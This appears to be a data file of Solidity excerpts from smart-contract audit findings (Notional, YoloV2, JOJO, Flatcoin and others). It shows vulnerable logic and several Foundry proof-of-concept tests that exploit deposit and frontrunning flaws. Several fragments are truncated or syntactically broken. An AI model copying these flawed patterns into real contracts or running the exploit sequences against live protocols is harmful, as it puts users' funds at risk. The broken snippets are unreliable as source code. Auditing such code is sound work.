"```\nfunction _getCollateralNet(IFlatcoinVault vault) private view returns (uint256 netCollateral) {\n    uint256 collateralBalance = vault.collateral().balanceOf(address(vault));\n    uint256 trackedCollateral = vault.stableCollateralTotal() + vault.getGlobalPositions().marginDepositedTotal;\n\n    if (collateralBalance < trackedCollateral) {\n        revert FlatcoinErrors.InvariantViolation(""collateralNet"");\n    }\n\n    return collateralBalance - trackedCollateral;\n}\n```\n```\nprofitLossTotal = 51 ETH  # gain by long\n\nnewMarginDepositedTotal = marginDepositedTotal + marginDelta + profitLossTotal\nnewMarginDepositedTotal = 50 ETH + 0 + 51 ETH = 101 ETH\n\n_updateStableCollateralTotal(-51 ETH)\nnewStableCollateralTotal = stableCollateralTotal + _stableCollateralAdjustment\nnewStableCollateralTotal = 50 ETH + (-51 ETH) = -1 ETH\nstableCollateralTotal = (newStableCollateralTotal > 0)? newStableCollateralTotal : 0;\nstableCollateralTotal = 0\n```"
```\nadjustmentSize * (secondPrice - firstPrice) - (adjustmentSize * tradeFees * 2)
"```\nfunction _tokensToShares(\n    uint128 amount,\n    uint128 rate\n) internal view returns (uint128) {\n    return uint128((uint256(amount) * DIVIDER) / uint256(rate));\n}\n```\n```\nfunction _sharesToTokens(\n    uint128 sharesN,\n    uint128 rate\n) internal view returns (uint128) {\n    return uint128((uint256(sharesN) * uint256(rate)) / DIVIDER);\n}\n```\n```\nrequire(\n    effectiveAmount >= REWARD_REDEEM_THRESHOLD,\n    ""Requested amount must be higher than redeem threshold""\n);\n```"
"```\nrequire(!v.frozen, ""Validator is frozen"")\n```\n```\nrequire(_validators[validatorId].unstakings[msg.sender].length > unstakingId, ""Unstaking does not exist"");\n\nrequire(us.amount >= amount, ""Unstaking has less tokens"");\n\nrequire(validatorId < validatorsN, ""Invalid validator"");\n\nUnstaking storage us = _validators[validatorId].unstakings[msg.sender][unstakingId];\n```"
"```\nfunction setValidatorAddress(uint128 validatorId, address newAddress) external whenNotPaused {\n    v.stakings[newAddress].shares += v.stakings[msg.sender].shares;\n    v.stakings[newAddress].staked += v.stakings[msg.sender].staked;\n    delete v.stakings[msg.sender];\n}\n```"
"```\nfunction castVoteInternal(\n    address voter,\n    uint256 proposalId,\n    uint8 support\n) internal returns (uint256) {\n    // Get the user's votes at the start of the proposal and at the time of voting. Take the minimum.\n    uint256 originalVotes = gohm.getPriorVotes(voter, proposal.startBlock);\n    uint256 currentVotes = gohm.getPriorVotes(voter, block.number);\n    uint256 votes = currentVotes > originalVotes? originalVotes : currentVotes;\n}\n```\n```\nfunction getPriorVotes(address account, uint256 blockNumber) external view returns (uint256) {\n    require(blockNumber < block.number, ""gOHM::getPriorVotes: not yet determined"");\n}\n```"
"```\nif (isCurrencyAllowed[tokenAddress]!= 1) {\n    revert InvalidCollection();\n}\n```\n```\nif (singleDeposit.tokenType == YoloV2__TokenType.ERC721) {\n    if (price == 0) {\n        price = _getReservoirPrice(singleDeposit);\n        prices[tokenAddress][roundId] = price;\n    }\n```\n```\nuint256 entriesCount = price / round.valuePerEntry;\nif (entriesCount == 0) {\n    revert InvalidValue();\n}\n```\n```\nelse if (tokenType == TokenType.ERC721) {\n    for (uint256 j; j < itemIdsLengthForSingleCollection; ) {\n        _executeERC721TransferFrom(items[i].tokenAddress, from, to, itemIds[j]);\n```\n```\nfunction _executeERC721TransferFrom(\n    address collection,\n    address from,\n    address to,\n    uint256 tokenId\n) internal {\n    (bool status, ) = collection.call(abi.encodeCall(IERC721.transferFrom, (from, to, tokenId)));\n}"
"```\nfor (uint256 i; i < numberOfRounds; ++i) {\n    uint256 roundId = _unsafeAdd(startingRoundId, i);\n    Round storage round = rounds[roundId];\n    uint256 roundValuePerEntry = round.valuePerEntry;\n    if (roundValuePerEntry == 0) {\n        (,, roundValuePerEntry) = _writeDataToRound({roundId: roundId, roundValue: 0});\n    }\n\n    _incrementUserDepositCount(roundId, round);\n\n    uint256 depositAmount = amounts[i];\n\n    if (depositAmount % roundValuePerEntry!= 0) {\n        revert InvalidValue();\n    }\n    uint256 entriesCount = _depositETH(round, roundId, roundValuePerEntry, depositAmount);\n    expectedValue += depositAmount;\n\n    entriesCounts[i] = entriesCount;\n}\n\nif (expectedValue!= msg.value) {\n    revert InvalidValue();\n}\n```\n```\nif (depositAmount % roundValuePerEntry!= 0):\n    revert InvalidValue()\n```\n```\nfunction test_deposit0ToRounds() external {\n    vm.deal(user2, 1 ether);\n    vm.deal(user3, 1 ether);\n\n    // First round starts normally\n    vm.prank(user2);\n    yolo.deposit{value: 1 ether}(1, _emptyDepositsCalldata());\n\n    // User3 will deposit 1 ether to the current round (1) and 0, 0 to round 2 and round 3\n    uint256[] memory amounts = new uint256[](3);\n    amounts[0] = 1 ether;\n    amounts[1] = 0;\n    amounts[2] = 0;\n    vm.prank(user3);\n    yolo.depositETHIntoMultipleRounds{value: 1 ether}(amounts);\n\n    // Check user3 indeed managed to deposit 0 ether to round 2\n    IYoloV2.Deposit[] memory deposits = _getDeposits(2);\n    assertEq(deposits.length, 1);\n    IYoloV2.Deposit memory deposit = deposits[0];\n    assertEq(uint8(deposit.tokenType), uint8(IYoloV2.YoloV2__TokenType.ETH));\n    assertEq(deposit.tokenAddress, address(0));\n    assertEq(deposit.tokenId, 0);\n    assertEq(deposit.tokenAmount, 0);\n    assertEq(deposit.depositor, user3);\n    assertFalse(deposit.withdrawn);\n    assertEq(deposit.currentEntryIndex, 0);\n\n    // Check user3 indeed managed to deposit 0 ether to round 3\n    deposits = _getDeposits(3);\n    assertEq(deposits.length, 1);\n    deposit = deposits[0];\n    assertEq(uint8(deposit.tokenType), uint8(IYoloV2.YoloV2__TokenType.ETH));\n    assertEq(deposit.tokenAddress, address(0));\n    assertEq(deposit.tokenId, 0);\n    assertEq(deposit.tokenAmount, 0);\n    assertEq(deposit.depositor, user3);\n    assertFalse(deposit.withdrawn);\n    assertEq(deposit.currentEntryIndex, 0);\n}\n```"
"```\nif (\n    _shouldDrawWinner(\n        startingRound.numberOfParticipants,\n        startingRound.maximumNumberOfParticipants,\n        startingRound.deposits.length\n    )\n) {\n    _drawWinner(startingRound, startingRoundId);\n}\n```\n```\n_startRound({\n    _roundsCount: roundId\n});\n```\n```\nif (\n   !paused() &&\n    _shouldDrawWinner(numberOfParticipants, round.maximumNumberOfParticipants, round.deposits.length)\n) {\n    _drawWinner(round, roundId);\n}\n```\n```\nfunction test_audit_deposit_more_than_max() public {\n    address alice = makeAddr(""Alice"");\n    address bob = makeAddr(""Bob"");\n\n    vm.deal(alice, 2 ether);\n    vm.deal(bob, 2 ether);\n\n    uint256[] memory amounts = new uint256[](2);\n    amounts[0] = 0.01 ether;\n    amounts[1] = 0.01 ether;\n\n    uint256 MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND = 100;\n    for (uint i = 0; i < MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND / 2; i++) {\n        vm.prank(alice);\n        yolo.depositETHIntoMultipleRounds{value: 0.02 ether}(amounts);\n\n        vm.prank(bob);\n        yolo.depositETHIntoMultipleRounds{value: 0.02 ether}(amounts);\n    }\n\n    vm.prank(owner);\n    yolo.togglePaused();\n\n    vm.prank(VRF_COORDINATOR);\n    uint256[] memory randomWords = new uint256[](1);\n    uint256 randomWord = 123;\n    randomWords[0] = randomWord;\n    yolo.rawFulfillRandomWords(FULFILL_RANDOM_WORDS_REQUEST_ID, randomWords);\n\n    vm.prank(owner);\n    yolo.togglePaused();\n\n    amounts = new uint256[](1);\n    amounts[0] = 0.01 ether;\n    vm.prank(bob);\n    yolo.depositETHIntoMultipleRounds{value: 0.01 ether}(amounts);\n\n    (\n       ,\n       ,\n       ,\n       ,\n       ,\n       ,\n       ,\n       ,\n       ,\n        YoloV2.Deposit[] memory round2Deposits\n    ) = yolo.getRound(2);\n\n    assertEq(round2Deposits.length, MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND + 1);\n}\n```"
"```\nFile: Constants.sol\n\nint256 internal constant PERCENTAGE_DECIMALS = 100;\n```\nint256 maxValueDeviationPercent = uint256(uint8(nToken.parameters[Constants.MAX_MINT_DEVIATION_LIMIT]));\n\nint256 deviationInPercentage = nTokenOracleValue.sub(nTokenSpotValue).abs().mul(Constants.PERCENTAGE_DECIMALS).div(nTokenOracleValue);\n\nrequire(deviationInPercentage <= maxValueDeviationPercent, ""Over Deviation Limit"");\n```\n```\nnTokenOracleValue.sub(nTokenSpotValue).abs().mul(Constants.PERCENTAGE_DECIMALS).div(nTokenOracleValue)\n\n((nTokenOracleValue - nTokenSpotValue) * Constants.PERCENTAGE_DECIMALS) / nTokenOracleValue\n\n((1_000_000_000 - 980_000_001) * Constants.PERCENTAGE_DECIMALS) / 1_000_000_000\n\n(19_999_999 * Constants.PERCENTAGE_DECIMALS) / 1_000_000_000\n\n1_999_999_900 / 1_000_000_000 = 1.9999999 = 1\n```"
"```\nfunction _sellfCash(\n    address receiver,\n    uint256 fCashToSell,\n    uint32 maxImpliedRate\n) private returns (uint256 tokensTransferred) {\n    (IERC20 token, bool isETH) = getToken(true);\n    uint256 balanceBefore = isETH? WETH.balanceOf(address(this)) : token.balanceOf(address(this));\n    uint16 currencyId = getCurrencyId();\n\n    (uint256 initialCashBalance, uint256 fCashBalance) = getBalances();\n    bool hasInsufficientfCash = fCashBalance < fCashToSell;\n\n    uint256 primeCashToWithdraw;\n    if (hasInsufficientfCash) {\n        (, primeCashToWithdraw,, ) = NotionalV2.getPrincipalFromfCashBorrow(\n            currencyId,\n            fCashToSell,\n            getMaturity(),\n            0,\n            block.timestamp\n        );\n        require(primeCashToWithdraw > 0, ""Redeem Failed"");\n\n        fCashToSell = fCashBalance;\n    }\n}"
```\n700 / 1300 = 0.5384615385 (53%)\n```\n```\nfunction getTargetExternalLendingAmount(\n    uint256 maxExternalUnderlyingLend;\n\n    uint256 maxExternalUnderlyingLend;\n    if (oracleData.currentExternalUnderlyingLend < oracleData.externalUnderlyingAvailableForWithdraw) {\n        maxExternalUnderlyingLend = (\n            oracleData.externalUnderlyingAvailableForWithdraw\n           .sub(oracleData.currentExternalUnderlyingLend)\n        )\n       .mul(uint256(Constants.PERCENTAGE_DECIMALS))\n       .div(rebalancingTargetData.externalWithdrawThreshold);\n    } else {\n        maxExternalUnderlyingLend = 0;\n    }\n```
"```\nfunction _rebalanceCurrency(uint16 currencyId, bool useCooldownCheck) private {\n    RebalancingContextStorage memory context = LibStorage.getRebalancingContext()[currencyId];\n    // Accrues interest up to the current block before any rebalancing is executed\n    IPrimeCashHoldingsOracle oracle = PrimeCashExchangeRate.getPrimeCashHoldingsOracle(currencyId);\n    PrimeRate memory pr = PrimeRateLib.buildPrimeRateStateful(currencyId);\n\n    bool hasCooldownPassed = _hasCooldownPassed(context);\n    (bool isExternalLendingUnhealthy, OracleData memory oracleData, uint256 targetAmount) = \n        _isExternalLendingUnhealthy(currencyId, oracle, pr);\n\n    // Cooldown check is bypassed when the owner updates the rebalancing targets\n    if (useCooldownCheck) require(hasCooldownPassed || isExternalLendingUnhealthy);\n}\n```"
"```\noffTargetPercentage = abs(90 - 100) / (100 + 90)\noffTargetPercentage = 10 / 190\noffTargetPercentage = 0.0526\noffTargetPercentage = 5.26%\n```\n```\noffTargetPercentage = abs(90 - 100) / 100\noffTargetPercentage = 10 / 100\noffTargetPercentage = 0.1\noffTargetPercentage = 10%\n```\n```\nfunction _isExternalLendingUnhealthy(\n    uint16 currencyId,\n    IPrimeCashHoldingsOracle oracle,\n    PrimeRate memory pr\n) internal view returns (bool isExternalLendingUnhealthy, OracleData memory oracleData, uint256 targetAmount) {\n    oracleData = oracle.getOracleData();\n\n    RebalancingTargetData memory rebalancingTargetData = \n        LibStorage.getRebalancingTargets()[currencyId][oracleData.holding];\n    PrimeCashFactors memory factors = \n        PrimeCashExchangeRate.getPrimeCashFactors(currencyId);\n    Token memory underlyingToken = \n        TokenHandler.getUnderlyingToken(currencyId);\n\n    targetAmount = \n        ExternalLending.getTargetExternalLendingAmount(\n            underlyingToken, factors, rebalancingTargetData, oracleData, pr\n        );\n\n    if (oracleData.currentExternalUnderlyingLend == 0) {\n        // If this is zero then there is no outstanding lending.\n        isExternalLendingUnhealthy = false;\n    } else {\n        uint256 offTargetPercentage = oracleData.currentExternalUnderlyingLend.toInt().sub(targetAmount.toInt()).abs().toUint().mul(uint256(Constants.PERCENTAGE_DECIMALS)).div(targetAmount.add(oracleData.currentExternalUnderlyingLend));\n\n        // prevent rebalance if change is not greater than 1%, important for health check and avoiding triggering\n        // rebalance shortly after rebalance on minimum change\n        isExternalLendingUnhealthy = \n            (targetAmount < oracleData.currentExternalUnderlyingLend) && (offTargetPercentage > 0);\n    }\n}"
"```\nfunction executeWithdraw(address from, address to, bool isInternal, bytes memory param) external nonReentrant {\n    Funding.executeWithdraw(state, from, to, isInternal, param);\n}\n```\n```\nfunction _withdraw(\n    Types.State storage state,\n    address spender,\n    address from,\n    address to,\n    uint256 primaryAmount,\n    uint256 secondaryAmount,\n    bool isInternal,\n    bytes memory param\n) private {\n    if (param.length!= 0) {\n        require(Address.isContract(to), ""target is not a contract"");\n        (bool success,) = to.call(param);\n        if (success == false) {\n            assembly {\n                let ptr := mload(0x40)\n                let size := returndatasize()\n                returndatacopy(ptr, 0, size)\n                revert(ptr, size)\n            }\n        }\n    }\n}\n```"
"```\njusdOutside[msg.sender] -= repayJUSDAmount;\nuint256 index = getIndex();\nuint256 lockedEarnUSDCAmount = jusdOutside[msg.sender].decimalDiv(index);\n\nrequire(\n    earnUSDCBalance[msg.sender] >= lockedEarnUSDCAmount,\n    ""lockedEarnUSDCAmount is bigger than earnUSDCBalance""\n);\nwithdrawEarnUSDCAmount = earnUSDCBalance[msg.sender] - lockedEarnUSDCAmount;\n```"
```\nfunction accrueRate() public {\n    uint256 currentTimestamp = block.timestamp;\n    if (currentTimestamp == lastUpdateTimestamp) {\n        return;\n    }\n    uint256 timeDifference = block.timestamp - uint256(lastUpdateTimestamp);\n    tRate = tRate.decimalMul((timeDifference * borrowFeeRate) / Types.SECONDS_PER_YEAR + 1e18);\n    lastUpdateTimestamp = currentTimestamp;\n}\n\nfunction getTRate() public view returns (uint256) {\n    uint256 timeDifference = block.timestamp - uint256(lastUpdateTimestamp);\n    return tRate + (borrowFeeRate * timeDifference) / Types.SECONDS_PER_YEAR;\n}\n```
"```\nfunction requestWithdraw(\n    Types.State storage state,\n    address from,\n    uint256 primaryAmount,\n    uint256 secondaryAmount\n) \n    external \n{\n    require(isWithdrawValid(state, msg.sender, from, primaryAmount, secondaryAmount), Errors.WITHDRAW_INVALID);\n    state.pendingPrimaryWithdraw[msg.sender] = primaryAmount;\n    state.pendingSecondaryWithdraw[msg.sender] = secondaryAmount;\n    state.withdrawExecutionTimestamp[msg.sender] = block.timestamp + state.withdrawTimeLock;\n    emit RequestWithdraw(msg.sender, primaryAmount, secondaryAmount, state.withdrawExecutionTimestamp[msg.sender]);\n}\n```"
"```\nfunction getIndex() public view returns (uint256) {\n    if (totalEarnUSDCBalance == 0) {\n        return 1e18;\n    } else {\n        return SignedDecimalMath.decimalDiv(getNetValue(), totalEarnUSDCBalance);\n    }\n}\n```\n```\nfunction deposit(uint256 amount) external {\n    require(amount!= 0, ""deposit amount is zero"");\n    uint256 feeAmount = amount * depositFeeRate;\n    if (feeAmount > 0) {\n        amount -= feeAmount;\n        IERC20(usdc).transferFrom(msg.sender, owner(), feeAmount);\n    }\n    uint256 earnUSDCAmount = amount / getIndex();\n    IERC20(usdc).transferFrom(msg.sender, address(this), amount);\n    JOJODealer(jojoDealer).deposit(0, amount, msg.sender);\n    earnUSDCBalance[msg.sender] += earnUSDCAmount;\n    jusdOutside[msg.sender] += amount;\n    totalEarnUSDCBalance += earnUSDCAmount;\n    require(getNetValue() <= maxNetValue, ""net value exceed limitation"");\n    uint256 quota = maxUsdcQuota[msg.sender] == 0? defaultUsdcQuota : maxUsdcQuota[msg.sender];\n    require(earnUSDCBalance[msg.sender] * getIndex() <= quota, ""usdc amount bigger than quota"");\n    emit DepositToHedging(msg.sender, amount, feeAmount, earnUSDCAmount);\n}\n```"
"```\nfunction mintViaUnderlying(\n    uint256 depositAmountExternal,\n    uint88 fCashAmount,\n    address receiver,\n    uint32 minImpliedRate\n) external override {\n    (/* */, uint256 maxFCash) = getTotalFCashAvailable();\n    _mintInternal(depositAmountExternal, fCashAmount, receiver, minImpliedRate, maxFCash);\n}\n```\n```\nif (maxFCash < fCashAmount) {\n    uint256 fCashAmountExternal = fCashAmount * precision / uint256(Constants.INTERNAL_TOKEN_PRECISION);\n    require(fCashAmountExternal <= depositAmountExternal);\n\n    NotionalV2.depositUnderlyingToken{value: msgValue}(address(this), currencyId, fCashAmountExternal);\n}\n```\nfunction testDepositViaUnderlying() public {\n    address alice = makeAddr(""alice"");\n    deal(address(asset), LENDER, 8800 * precision, true);\n    deal(address(asset), alice, 5000 * precision, true);\n\n    vm.stopPrank();\n    vm.startPrank(alice);\n    asset.approve(address(w), type(uint256).max);\n\n    //==============================LENDER START=============================//\n\n    vm.stopPrank();\n    vm.startPrank(LENDER);\n    asset.approve(address(w), type(uint256).max);\n    assertEq(asset.balanceOf(LENDER), 8800e18);\n\n    (/* */, uint256 maxFCash) = w.getTotalFCashAvailable();\n    console2.log(""current maxFCash:"", maxFCash);\n\n    uint32 minImpliedRate = 0.15e9;\n    vm.expectRevert(""Trade failed, slippage"");\n    w.mintViaUnderlying(5000e18, 5000e8, LENDER, minImpliedRate);\n\n    //==============================LENDER END=============================//\n\n    //======================alice frontrun to mint some shares.============//\n\n    vm.stopPrank();\n    vm.startPrank(alice);\n    w.mint(5000e8, alice);\n\n    //==========================LENDER TX =================================//\n\n    vm.stopPrank();\n    vm.startPrank(LENDER);\n    asset.approve(address(w), type(uint256).max);\n    assertEq(asset.balanceOf(LENDER), 8800e18);\n\n    w.mintViaUnderlying(5000e18, 5000e8, LENDER, minImpliedRate);\n\n    console2.log(""lender mint token:"", w.balanceOf(LENDER));\n    console2.log(""lender cost DAI:"", 8800e18 - asset.balanceOf(LENDER));\n}\n```"
"```\nfunction _mintInternal(\n    //...SNIP...\n    if (maxFCash < fCashAmount) {\n        uint256 fCashAmountExternal = fCashAmount * precision / uint256(Constants.INTERNAL_TOKEN_PRECISION);\n        require(fCashAmountExternal <= depositAmountExternal);\n\n        // Residual (depositAmountExternal - fCashAmountExternal) will be transferred\n        // back to the account\n        NotionalV2.depositUnderlyingToken{value: msgValue}(address(this), currencyId, fCashAmountExternal);\n\n        // Residual tokens will be sent back to msg.sender, not the receiver. The msg.sender\n        // was used to transfer tokens in and these are any residual tokens left that were not\n        // lent out. Sending these tokens back to the receiver risks them getting locked on a\n        // contract that does not have the capability to transfer them off\n        _sendTokensToReceiver(token, msg.sender, isETH, balanceBefore);\n    }\n```\n```\nFile: AccountAction.sol\n\nfunction depositUnderlyingToken(\n    address account,\n    uint16 currencyId,\n    uint256 amountExternalPrecision\n) external payable nonReentrant returns (uint256) {\n    int256 primeCashReceived = balanceState.depositUnderlyingToken(\n        msg.sender,\n        SafeInt256.toInt(amountExternalPrecision),\n        false // there should never be excess ETH here by definition\n    );\n}\n```\nfunction _sendTokensToReceiver(\n    IERC20 token,\n    address receiver,\n    bool isETH,\n    uint256 balanceBefore\n) private returns (uint256 tokensTransferred) {\n    uint256 balanceAfter = isETH? WETH.balanceOf(address(this)) : token.balanceOf(address(this));\n    tokensTransferred = balanceAfter - balanceBefore;\n\n    if (isETH) {\n        IERC20(address(WETH)).transfer(receiver, tokensTransferred);\n    } else if (tokensTransferred > 0) {\n        token.safeTransfer(receiver, tokensTransferred);\n    }\n}\n```"
"```\nfunction _lendLegacy(\n    uint256 preTradeCash = getCashBalance();\n\n    BalanceActionWithTrades[] memory action = EncodeDecode.encodeLegacyLendTrade(\n        currencyId,\n        getMarketIndex(),\n        depositAmountExternal,\n        fCashAmount,\n        minImpliedRate\n    );\n    NotionalV2.batchBalanceAndTradeAction{value: msgValue}(address(this), action);\n\n    uint256 postTradeCash = getCashBalance();\n\n    if (preTradeCash!= postTradeCash) {\n        if (isETH) {\n            NotionalV2.withdraw(currencyId, _safeUint88(postTradeCash - preTradeCash), false);\n        }\n    }\n)\n```\nfunction depositUnderlyingExternal(\n    address account,\n    uint16 currencyId,\n    int256 _underlyingExternalDeposit,\n    PrimeRate memory primeRate,\n    bool returnNativeTokenWrapped\n) internal returns (int256 actualTransferExternal, int256 netPrimeSupplyChange) {\n    uint256 underlyingExternalDeposit = _underlyingExternalDeposit.toUint();\n    if (underlyingExternalDeposit == 0) {\n        return (0, 0);\n    }\n\n    Token memory underlying = getUnderlyingToken(currencyId);\n    if (underlying.tokenType == TokenType.Ether) {\n        if (underlyingExternalDeposit < msg.value) {\n            GenericToken.transferNativeTokenOut(\n                account,\n                msg.value - underlyingExternalDeposit,\n                returnNativeTokenWrapped\n            );\n        } else {\n            require(underlyingExternalDeposit == msg.value, ""ETH Balance"");\n        }\n\n        actualTransferExternal = _underlyingExternalDeposit;\n    }\n}\n```\nfunction _lendLegacy(\n    //...SNIP...\n    // Notional will return any residual ETH as the native token. When we sendTokensToReceiver those\n    // native ETH tokens will be wrapped back to WETH.\n```\n```\nfunction _sendTokensToReceiver(\n    IERC20 token,\n    address receiver,\n    bool isETH,\n    uint256 balanceBefore\n) private returns (uint256 tokensTransferred) {\n    uint256 balanceAfter = isETH? WETH.balanceOf(address(this)) : token.balanceOf(address(this));\n    tokensTransferred = balanceAfter - balanceBefore;\n\n    if (isETH) {\n        IERC20(address(WETH)).transfer(receiver, tokensTransferred);\n    } else if (tokensTransferred > 0) {\n        token.safeTransfer(receiver, tokensTransferred);\n    }\n}\n```"
"```\nfunction _isExternalLendingUnhealthy(\n    uint16 currencyId,\n    IPrimeCashHoldingsOracle oracle,\n    PrimeRate memory pr\n) internal view returns (bool isExternalLendingUnhealthy, OracleData memory oracleData, uint256 targetAmount) {\n    PrimeCashFactors memory factors = PrimeCashExchangeRate.getPrimeCashFactors(currencyId);\n    Token memory underlyingToken = TokenHandler.getUnderlyingToken(currencyId);\n\n    targetAmount = ExternalLending.getTargetExternalLendingAmount(\n        underlyingToken, factors, rebalancingTargetData, oracleData, pr\n    );\n}\n```"
"```\nfunction recover(address token, uint256 amount) external onlyOwner {\n    if (Constants.ETH_ADDRESS == token) {\n        (bool status,) = msg.sender.call{value: amount}("""");\n        require(status);\n    } else {\n        IERC20(token).transfer(msg.sender, amount);\n    }\n}\n```"
"```\nfunction _claimRewards(address account, uint256 nTokenBalanceBefore, uint256 nTokenBalanceAfter) private {\n    uint256 rewardToClaim = _calculateRewardToClaim(account, nTokenBalanceBefore, accumulatedRewardPerNToken);\n\n    rewardDebtPerAccount[account] = nTokenBalanceAfter\n       .mul(accumulatedRewardPerNToken)\n       .div(uint256(Constants.INTERNAL_TOKEN_PRECISION))\n       .toUint128();\n\n    if (0 < rewardToClaim) {\n        GenericToken.safeTransferOut(REWARD_TOKEN, account, rewardToClaim);\n        emit RewardTransfer(REWARD_TOKEN, account, rewardToClaim);\n    }\n}\n```\n_claimRewards -> claimRewardsDirect\n\n_claimRewards -> claimRewards -> Incentives.claimIncentives\n_claimRewards -> claimRewards -> Incentives.claimIncentives -> BalancerHandler._finalize\n_claimRewards -> claimRewards -> Incentives.claimIncentives -> BalancerHandler._finalize -> Used by many functions\n\n_claimRewards -> claimRewards -> Incentives.claimIncentives -> BalancerHandler.claimIncentivesManual\n_claimRewards -> claimRewards -> Incentives.claimIncentives -> BalancerHandler.claimIncentivesManual -> nTokenAction.nTokenClaimIncentives\n_claimRewards -> claimRewards -> Incentives.claimIncentives -> BalancerHandler.claimIncentivesManual -> nTokenAction.nTokenClaimIncentives -> claimNOTE\n```"
"```\nfunction _getMaturedCashValue(uint256 fCashAmount) internal view returns (uint256) {\n    if (!hasMatured()) {\n        return 0;\n    }\n    // If the fCash has matured we use the cash balance instead.\n    (uint16 currencyId, uint40 maturity) = getDecodedID();\n    PrimeRate memory pr = NotionalV2.getSettlementRate(currencyId, maturity);\n\n    // fCash has not yet been settled\n    if (pr.supplyFactor == 0) {\n        return 0;\n    }\n   ..\nSNIP..\n```\n```\nfunction totalAssets() public view override returns (uint256) {\n    if (hasMatured()) {\n        uint256 primeCashValue = _getMaturedCashValue(totalSupply());\n        require(primeCashValue < uint256(type(int256).max);\n        int256 externalValue = NotionalV2.convertCashBalanceToExternal(\n            getCurrencyId(), int256(primeCashValue), true\n        );\n        return externalValue >= 0? uint256(externalValue) : 0;\n    }\n}"
"```\nfunction getOracleData() external view override returns (OracleData memory oracleData) {\n    (/* */, uint256 supplyCap) = IPoolDataProvider(POOL_DATA_PROVIDER).getReserveCaps(underlying);\n    // Supply caps are returned as whole token values\n    supplyCap = supplyCap * UNDERLYING_PRECISION;\n    uint256 aTokenSupply = IPoolDataProvider(POOL_DATA_PROVIDER).getATokenTotalSupply(underlying);\n\n    // If supply cap is zero, that means there is no cap on the pool\n    if (supplyCap == 0) {\n        oracleData.maxExternalDeposit = type(uint256).max;\n    } else if (supplyCap <= aTokenSupply) {\n        oracleData.maxExternalDeposit = 0;\n    } else {\n        oracleData.maxExternalDeposit = supplyCap - aTokenSupply;\n    }\n}\n```\nrequire(\n  supplyCap == 0 ||\n    (\n      IAToken(reserveCache.aTokenAddress).scaledTotalSupply() +\n      uint256(reserve.accruedToTreasury)\n    ).rayMul(reserveCache.nextLiquidityIndex) + amount <=\n    supplyCap * (10 ** reserveCache.reserveConfiguration.getDecimals()),\n  Errors.SUPPLY_CAP_EXCEEDED\n);\n```"
"```\nfunction getTargetExternalLendingAmount(\n    Token memory underlyingToken,\n    PrimeCashFactors memory factors,\n    RebalancingTargetData memory rebalancingTargetData,\n    OracleData memory oracleData,\n    PrimeRate memory primeRate\n) internal pure returns (uint256 targetAmount) {\n    if (rebalancingTargetData.targetUtilization == 0) {\n        return 0;\n    }\n\n    if (targetAmount < oracleData.currentExternalUnderlyingLend) {\n        uint256 forRedemption = oracleData.currentExternalUnderlyingLend - targetAmount;\n        if (oracleData.externalUnderlyingAvailableForWithdraw < forRedemption) {\n            targetAmount = targetAmount.add(forRedemption - oracleData.externalUnderlyingAvailableForWithdraw);\n        }\n    }\n```"
"```\nfunction getTargetExternalLendingAmount(\n    Token memory underlyingToken,\n    PrimeCashFactors memory factors,\n    RebalancingTargetData memory rebalancingTargetData,\n    OracleData memory oracleData,\n    PrimeRate memory primeRate\n) internal pure returns (uint256 targetAmount) {\n    targetAmount = SafeUint256.min(\n        uint256(underlyingToken.convertToExternal(targetExternalUnderlyingLend)),\n        SafeUint256.min(maxExternalUnderlyingLend, oracleData.maxExternalDeposit)\n    );\n}"
"```\nif (maxFCash < fCashAmount) {\n    uint256 fCashAmountExternal = fCashAmount * precision / uint256(Constants.INTERNAL_TOKEN_PRECISION);\n    require(fCashAmountExternal <= depositAmountExternal);\n\n    // Residual (depositAmountExternal - fCashAmountExternal) will be transferred\n    // back to the account\n    NotionalV2.depositUnderlyingToken{value: msgValue}(address(this), currencyId, fCashAmountExternal);\n} else if (isETH || hasTransferFee || getCashBalance() > 0) {\n```\n```\nelse {\n    actualTransferExternal = GenericToken.safeTransferIn(\n        underlying.tokenAddress, account, underlyingExternalDeposit\n    ).toInt();\n}\n\nnetPrimeSupplyChange = _postTransferPrimeCashUpdate(\n    account, currencyId, actualTransferExternal, underlying, primeRate\n)\n```\n```\n_mint(receiver, fCashAmount)"
"```\naddress[] memory targets = new address[](UNDERLYING_IS_ETH? 2 : 1);\nbytes[] memory callData = new bytes[](UNDERLYING_IS_ETH? 2 : 1);\ntargets[0] = LENDING_POOL;\ncallData[0] = abi.encodeWithSelector(\n    ILendingPool.withdraw.selector, \n    underlyingToken, \n    withdrawAmount, \n    address(NOTIONAL)\n);\n\nif (UNDERLYING_IS_ETH) {\n    targets[1] = address(Deployments.WETH);\n    callData[1] = abi.encodeWithSelector(WETH9.withdraw.selector, withdrawAmount);\n}\n\ndata = new RedeemData[](1);\nuint8 rebasingTokenBalanceAdjustment = UNDERLYING_DECIMALS <= 8? 1 : 0;\ndata[0] = RedeemData(\n    targets, \n    callData, \n    withdrawAmount, \n    ASSET_TOKEN, \n    rebasingTokenBalanceAdjustment\n);\n```\n```\nfor (uint256 j; j < data.targets.length; j++) {\n    GenericToken.executeLowLevelCall(data.targets[j], 0, data.callData[j]);\n}\n\nrequire(newUnderlyingBalance.sub(oldUnderlyingBalance) >= data.expectedUnderlying);\n```\n```\nredeemAmounts[0] = currentAmount - targetAmount\n```"
"```\nfunction topUp(\n    address source,\n    uint256[] memory indices\n) external onlyRole(EXECUTOR_ROLE) {\n    for (uint i = 0; i < indices.length; i++) {\n        StakingRewards staking = stakingContracts[i];\n        StakingConfig memory config = stakingConfigs[staking];\n\n        staking.setRewardsDuration(config.rewardsDuration);\n\n        rewardToken.transferFrom(\n            source,\n            address(staking),\n            config.rewardAmount\n        );\n\n        staking.notifyRewardAmount(config.rewardAmount);\n\n        emit ToppedUp(staking, config);\n    }\n}\n```"
"```\nfunction _retrieve() internal {\n    // Execute the withdrawal from the _target, which might be a Sablier stream or another protocol\n    _stream.execute(\n        _target,\n        abi.encodeWithSelector(\n            ISablierV2ProxyTarget.withdrawMax.selector,\n            _target,\n            _id,\n            address(this)\n        )\n    );\n}\n```\nfunction _retrieve() internal {\n    // Execute the withdrawal from the _target, which might be a Sablier stream or another protocol\n    _stream.execute(\n        _target,\n        abi.encodeWithSelector(\n            ISablierV2ProxyTarget.withdrawMax.selector,\n            _target,\n            _id,\n            address(this)\n        )\n    );\n}"
